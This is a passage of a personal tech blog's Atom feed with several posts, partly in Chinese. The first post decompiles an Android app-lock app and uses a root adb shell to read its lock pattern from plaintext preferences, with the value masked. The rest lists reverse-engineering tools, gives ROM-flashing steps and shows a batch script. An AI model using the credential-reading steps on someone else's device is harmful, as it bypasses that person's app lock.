&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;boolean&lt;/span&gt; &lt;span class="nf"&gt;checkpattern&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;paramString&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;paramString&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;equals&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;patternPassword&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;


&lt;span class="c1"&gt;// Line 181&lt;/span&gt;
&lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;initView&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;initRecommendZDLockView&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
  &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;patternPassword&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;mConfig&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getApplockPasswordPattern&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
  &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;mLockView&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="n"&gt;LockPatternView&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="n"&gt;findViewById&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2131427460&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
  &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;mForgetPassword&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="n"&gt;LinearLayout&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="n"&gt;findViewById&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2131427459&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
  &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;mLockView&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setOnPatternListener&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;ApplockPatternListener&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;((-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;mConfig&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getSecurityQuestionIndex&lt;/span&gt;&lt;span class="o"&gt;())&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;calledIntent&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;calledIntent&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;mForgetPassword&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setVisibility&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="n"&gt;TextView&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="n"&gt;findViewById&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2131427799&lt;/span&gt;&lt;span class="o"&gt;)).&lt;/span&gt;&lt;span class="na"&gt;getPaint&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;setFlags&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;mForgetPassword&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setOnClickListener&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
  &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;mLockView&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;enableInput&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
  &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;mLockView&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setInStealthMode&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;mConfig&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;isHideTrace&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt;
  &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;mLockView&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setInVibrateMode&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;mConfig&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;isVibrateTracelessUnlock&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;


&lt;span class="c1"&gt;// Line 54&lt;/span&gt;
&lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="n"&gt;ConfigManager&lt;/span&gt; &lt;span class="n"&gt;mConfigManager&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// com\zdworks\android\toolbox\global\ConfigManager.java&lt;/span&gt;
&lt;span class="c1"&gt;// Line 377&lt;/span&gt;
&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="nf"&gt;getApplockPasswordPattern&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;mSharedPre&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;applock_pw_pattern&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;


&lt;span class="c1"&gt;// Line 219&lt;/span&gt;
&lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="nf"&gt;ConfigManager&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Context&lt;/span&gt; &lt;span class="n"&gt;paramContext&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;mContext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;paramContext&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;mSharedPre&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;PreferenceManager&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getDefaultSharedPreferences&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;paramContext&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;跟到最上面發現原來是&lt;a href="http://developer.android.com/reference/android/preference/PreferenceManager.html"&gt;PreferenceManager&lt;/a&gt;，可以去把我的密碼找出來了！&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Microsoft Windows [版本 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\Inndy&amp;gt;adb shell
shell@android:/ $ su
su
root@android:/ # cd data/data
cd data/data
root@android:/data/data # ls | busybox grep -e &amp;#39;zd&amp;#39;
ls | busybox grep -e &amp;#39;zd&amp;#39;
com.zdworks.android.toolbox
root@android:/data/data # cd com.zd*
cd com.zd*
root@android:/data/data/com.zdworks.android.toolbox # ls
ls
cache
databases
files
lib
shared_prefs
root@android:/data/data/com.zdworks.android.toolbox # cd sh*
cd sh*
root@android:/data/data/com.zdworks.android.toolbox/shared_prefs # ls
ls
GetJarClientPrefs.xml
com.zdworks.android.toolbox_preferences.xml
com.zdworks.android.toolboxsession.xml
lastUsageCheckFile.xml
splash_hash.xml
splash_pref.xml
timestamp.xml
zda_agent_online_setting_com.zdworks.android.toolbox.xml
root@android:/data/data/com.zdworks.android.toolbox/shared_prefs # cat com.zdwor
ks.android.toolbox_preferences.xml | busybox grep -e &amp;#39;applock_pw_pattern&amp;#39;
&amp;lt;string name=&amp;quot;applock_pw_pattern&amp;quot;&amp;gt;*******&amp;lt;/string&amp;gt;
root@android:/data/data/com.zdworks.android.toolbox/shared_prefs #
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;搞定了，結案。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最後小提醒：保護手機安全，請隨手關閉adb，並且把adb shell的 root 權限設定為每次詢問。&lt;/strong&gt;&lt;/p&gt;</content></entry><entry><title>Reverse Engineering Tools</title><link href="https://blog.inndy.tw/2014/02/01/reverse-engineering-tools/" rel="alternate"></link><published>2014-02-01T12:23:00+08:00</published><updated>2014-02-01T12:23:00+08:00</updated><author><name>Inndy</name></author><id>tag:blog.inndy.tw,2014-02-01:/2014/02/01/reverse-engineering-tools/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;.NET Framework&lt;ul&gt;
&lt;li&gt;ILSpy&lt;ul&gt;
&lt;li&gt;free software&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ilspy.net/"&gt;http://ilspy.net/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://community.sharpdevelop.net/blogs/marcueusebiu/archive/2011/04/12/ilspy-debugger-preview.aspx"&gt;ILSpy with debugger&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;de4dot&lt;ul&gt;
&lt;li&gt;to clean obfuscated program&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/0xd4d/de4dot"&gt;https://github.com/0xd4d/de4dot&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;.NET Reflector&lt;ul&gt;
&lt;li&gt;$$$ :(&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.red-gate.com/products/dotnet-development/reflector/"&gt;http://www.red-gate.com/products/dotnet-development/reflector/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;monodis / ildasm are your good friends&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.mono-project.com/Dis/Assembling_CIL_Code"&gt;http://www.mono-project.com/Dis/Assembling_CIL_Code&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://msdn.microsoft.com/zh-tw/library/f7dy01k1(v=vs.110).aspx"&gt;http://msdn.microsoft.com/zh-tw/library/f7dy01k1(v …&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;ul&gt;
&lt;li&gt;.NET Framework&lt;ul&gt;
&lt;li&gt;ILSpy&lt;ul&gt;
&lt;li&gt;free software&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ilspy.net/"&gt;http://ilspy.net/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://community.sharpdevelop.net/blogs/marcueusebiu/archive/2011/04/12/ilspy-debugger-preview.aspx"&gt;ILSpy with debugger&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;de4dot&lt;ul&gt;
&lt;li&gt;to clean obfuscated program&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/0xd4d/de4dot"&gt;https://github.com/0xd4d/de4dot&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;.NET Reflector&lt;ul&gt;
&lt;li&gt;$$$ :(&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.red-gate.com/products/dotnet-development/reflector/"&gt;http://www.red-gate.com/products/dotnet-development/reflector/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;monodis / ildasm are your good friends&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.mono-project.com/Dis/Assembling_CIL_Code"&gt;http://www.mono-project.com/Dis/Assembling_CIL_Code&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://msdn.microsoft.com/zh-tw/library/f7dy01k1(v=vs.110).aspx"&gt;http://msdn.microsoft.com/zh-tw/library/f7dy01k1(v=vs.110).aspx&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Java&lt;ul&gt;
&lt;li&gt;Java Decompiler&lt;ul&gt;
&lt;li&gt;GUI! ( jd-gui )&lt;/li&gt;
&lt;li&gt;&lt;a href="http://jd.benow.ca/"&gt;http://jd.benow.ca/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;APK&lt;ul&gt;
&lt;li&gt;APK-Multi-Tool&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/APK-Multi-Tool/APK-Multi-Tool"&gt;https://github.com/APK-Multi-Tool/APK-Multi-Tool&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;onekey-decompile-apk&lt;ul&gt;
&lt;li&gt;&lt;a href="https://code.google.com/p/onekey-decompile-apk/"&gt;https://code.google.com/p/onekey-decompile-apk/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Linux&lt;ul&gt;
&lt;li&gt;gdb&lt;ul&gt;
&lt;li&gt;also available on Windows&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.gnu.org/software/gdb/"&gt;https://www.gnu.org/software/gdb/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Windows&lt;ul&gt;
&lt;li&gt;WinDbg&lt;ul&gt;
&lt;li&gt;official tool&lt;/li&gt;
&lt;li&gt;&lt;a href="http://msdn.microsoft.com/en-us/windows/hardware/hh852365.aspx"&gt;http://msdn.microsoft.com/en-us/windows/hardware/hh852365.aspx&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OllyDbg&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ollydbg.de/"&gt;http://www.ollydbg.de/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cheat Engine&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.cheatengine.org/"&gt;http://www.cheatengine.org/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;General&lt;ul&gt;
&lt;li&gt;IDA&lt;ul&gt;
&lt;li&gt;widely used and powerful tool&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.hex-rays.com/products/ida/"&gt;https://www.hex-rays.com/products/ida/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;There are some tools mentioned in &lt;a href="http://reverseengineering.stackexchange.com/questions/1817/is-there-any-disassembler-second-to-ida"&gt;http://reverseengineering.stackexchange.com/questions/1817/is-there-any-disassembler-second-to-ida&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;And there is a good site: &lt;em&gt;Reverse Engineering using the Linux Operating System&lt;/em&gt;
( &lt;a href="http://reverse.lostrealm.com/"&gt;http://reverse.lostrealm.com/&lt;/a&gt; )&lt;/p&gt;
&lt;p&gt;The last thing....&lt;/p&gt;
&lt;p&gt;I don't have any device from Apple.
SO I KNOW NOTHING ABOUT iOS and OSX. :P&lt;/p&gt;</content></entry><entry><title>如何刷HTC Flyer P512的ROM（CyanogenMod10）</title><link href="https://blog.inndy.tw/2014/02/01/flashing-cyanogen-mod-10-for-htc-flyer-p512/" rel="alternate"></link><published>2014-02-01T12:10:00+08:00</published><updated>2014-02-01T12:10:00+08:00</updated><author><name>Inndy</name></author><id>tag:blog.inndy.tw,2014-02-01:/2014/02/01/flashing-cyanogen-mod-10-for-htc-flyer-p512/</id><summary type="html">&lt;p&gt;工科技藝競賽的時候入手了一台很難用的HTC Flyer P512
天啊...Android 3.X是要給鬼用喔
於是Google了很久終於找到了可以用的ROM，而且是CM10唷！
雖然還不夠完美，但總比繼續用3.X的Android好 T^T&lt;/p&gt;
&lt;p&gt;關於Locked, Unlock, Relock保固差異的說明請見這篇：&lt;a href="http://www.mobile01.com/topicdetail.php?f=566&amp;amp;t=3324387"&gt;http://www.mobile01.com/topicdetail.php?f=566&amp;amp;t=3324387&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;簡單來說：Locked有完整保固，Unlocked無保固，Relocked部份保固
&lt;strong&gt;自行斟酌再行刷機&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;HTC Official Unlock：&lt;a href="http://www.htcdev.com/bootloader"&gt;http://www.htcdev.com/bootloader&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;刷CWM：&lt;a href="http://forum.xda-developers.com/showthread.php?t=1775840"&gt;http://forum.xda-developers.com/showthread.php?t=1775840&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;ROM網址 …&lt;/li&gt;&lt;/ol&gt;</summary><content type="html">&lt;p&gt;工科技藝競賽的時候入手了一台很難用的HTC Flyer P512
天啊...Android 3.X是要給鬼用喔
於是Google了很久終於找到了可以用的ROM，而且是CM10唷！
雖然還不夠完美，但總比繼續用3.X的Android好 T^T&lt;/p&gt;
&lt;p&gt;關於Locked, Unlock, Relock保固差異的說明請見這篇：&lt;a href="http://www.mobile01.com/topicdetail.php?f=566&amp;amp;t=3324387"&gt;http://www.mobile01.com/topicdetail.php?f=566&amp;amp;t=3324387&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;簡單來說：Locked有完整保固，Unlocked無保固，Relocked部份保固
&lt;strong&gt;自行斟酌再行刷機&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;HTC Official Unlock：&lt;a href="http://www.htcdev.com/bootloader"&gt;http://www.htcdev.com/bootloader&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;刷CWM：&lt;a href="http://forum.xda-developers.com/showthread.php?t=1775840"&gt;http://forum.xda-developers.com/showthread.php?t=1775840&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;ROM網址：&lt;a href="http://forum.xda-developers.com/showthread.php?t=1795342"&gt;http://forum.xda-developers.com/showthread.php?t=1795342&lt;/a&gt;
   把zip放進SD卡，用CWM install from zip&lt;/li&gt;
&lt;li&gt;刷完ROM之後，請把boot.img（裏面有兩個，我忘了是哪一個，我沒有S-OFF）解出來，自行刷入
   &lt;code&gt;fastboot flash boot boot.img&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Google APPs：&lt;a href="http://goo.im/gapps/gapps-jb-20121011-signed.zip"&gt;http://goo.im/gapps/gapps-jb-20121011-signed.zip&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</content></entry><entry><title>iAutoUpdater -- Binary Signature Updater</title><link href="https://blog.inndy.tw/2013/02/07/binary-signature-updater/" rel="alternate"></link><published>2013-02-07T03:52:00+08:00</published><updated>2013-02-07T03:52:00+08:00</updated><author><name>Inndy</name></author><id>tag:blog.inndy.tw,2013-02-07:/2013/02/07/binary-signature-updater/</id><summary type="html">&lt;h2&gt;Screenshot&lt;/h2&gt;
&lt;p&gt;&lt;img alt="screenshot" src="/images/2013-02-07-binary-signature-updater--9cef17b1--Ia9JQZO.png"&gt;&lt;/p&gt;
&lt;h2&gt;Feature&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Built-in simple script engine (assemlby-liked)&lt;/li&gt;
&lt;li&gt;Updating your binary patch in 0.1 sec!&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Download&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://goo.gl/n1FYm"&gt;http://goo.gl/n1FYm&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Password&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Powered_By_Inndy&lt;/code&gt;&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Screenshot&lt;/h2&gt;
&lt;p&gt;&lt;img alt="screenshot" src="/images/2013-02-07-binary-signature-updater--9cef17b1--Ia9JQZO.png"&gt;&lt;/p&gt;
&lt;h2&gt;Feature&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Built-in simple script engine (assemlby-liked)&lt;/li&gt;
&lt;li&gt;Updating your binary patch in 0.1 sec!&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Download&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://goo.gl/n1FYm"&gt;http://goo.gl/n1FYm&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Password&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Powered_By_Inndy&lt;/code&gt;&lt;/p&gt;</content></entry><entry><title>Obtain desktop path with batch</title><link href="https://blog.inndy.tw/2013/02/04/obtain-desktop-path-with-batch/" rel="alternate"></link><published>2013-02-04T12:25:00+08:00</published><updated>2013-02-04T12:25:00+08:00</updated><author><name>Inndy</name></author><id>tag:blog.inndy.tw,2013-02-04:/2013/02/04/obtain-desktop-path-with-batch/</id><summary type="html">&lt;p&gt;&lt;em&gt;I havn't tested this in Windows 8 yet.&lt;/em&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="k"&gt;echo&lt;/span&gt; off
    &lt;span class="k"&gt;call&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;GetDesktop&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; desktop path = &lt;span class="nv"&gt;%desktop%&lt;/span&gt;
    &lt;span class="k"&gt;goto&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;EOF&lt;/span&gt;


    &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;GetDesktop&lt;/span&gt;
    reg query &lt;span class="s2"&gt;&amp;quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders&amp;quot;&lt;/span&gt; /v Desktop &lt;span class="p"&gt;|&lt;/span&gt; find &lt;span class="s2"&gt;&amp;quot;Desktop&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;&amp;gt;&lt;/span&gt; o.txt
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="k"&gt;/F&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;tokens=2 delims=\&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;%%&lt;/span&gt;a &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;o.txt&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;desktop=&lt;/span&gt;&lt;span class="nv"&gt;%userprofile%&lt;/span&gt;&lt;span class="s2"&gt;\&lt;/span&gt;&lt;span class="se"&gt;%%&lt;/span&gt;&lt;span class="s2"&gt;a …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;&lt;em&gt;I havn't tested this in Windows 8 yet.&lt;/em&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="k"&gt;echo&lt;/span&gt; off
    &lt;span class="k"&gt;call&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;GetDesktop&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; desktop path = &lt;span class="nv"&gt;%desktop%&lt;/span&gt;
    &lt;span class="k"&gt;goto&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;EOF&lt;/span&gt;


    &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;GetDesktop&lt;/span&gt;
    reg query &lt;span class="s2"&gt;&amp;quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders&amp;quot;&lt;/span&gt; /v Desktop &lt;span class="p"&gt;|&lt;/span&gt; find &lt;span class="s2"&gt;&amp;quot;Desktop&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;&amp;gt;&lt;/span&gt; o.txt
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="k"&gt;/F&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;tokens=2 delims=\&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;%%&lt;/span&gt;a &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;o.txt&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;desktop=&lt;/span&gt;&lt;span class="nv"&gt;%userprofile%&lt;/span&gt;&lt;span class="s2"&gt;\&lt;/span&gt;&lt;span class="se"&gt;%%&lt;/span&gt;&lt;span class="s2"&gt;a&amp;quot;&lt;/span&gt;
    &lt;span class="k"&gt;del&lt;/span&gt; o.txt
